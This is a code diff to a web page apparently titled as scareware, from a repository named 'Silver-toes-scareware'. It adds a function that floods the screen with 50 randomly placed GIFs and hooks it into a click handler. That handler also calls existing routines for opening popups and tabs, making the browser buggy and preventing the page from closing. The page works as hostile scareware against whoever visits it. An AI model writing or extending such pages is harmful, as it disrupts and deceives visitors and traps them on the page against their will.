@@ -46,6 +46,11 @@
             color: red;
             z-index: 1000;
         }
+        .gif-popup {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+        }
     </style>
 </head>
 <body>
@@ -223,6 +228,28 @@
             }, 1000);
         }
 
+        function popUpGifs() {
+            const gifUrls = [
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Smd.gif',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Mb%20bro.gif',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/How%20KOC%20made%20Ts.gif',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Get.gif'
+            ];
+            const numGifs = 50; // Number of GIFs to pop up
+            const interval = 100; // Interval between GIF appearances in milliseconds
+
+            for (let i = 0; i < numGifs; i++) {
+                setTimeout(() => {
+                    const img = document.createElement('img');
+                    img.className = 'gif-popup';
+                    img.src = gifUrls[Math.floor(Math.random() * gifUrls.length)];
+                    img.style.top = `${Math.random() * 100}%`;
+                    img.style.left = `${Math.random() * 100}%`;
+                    document.body.appendChild(img);
+                }, i * interval);
+            }
+        }
+
         document.addEventListener('click', () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
@@ -238,6 +265,7 @@
             openPopupsAndTabs();
             makeBrowserBuggy();
             preventClose();
+            popUpGifs();
         });
     </script>
 </body>
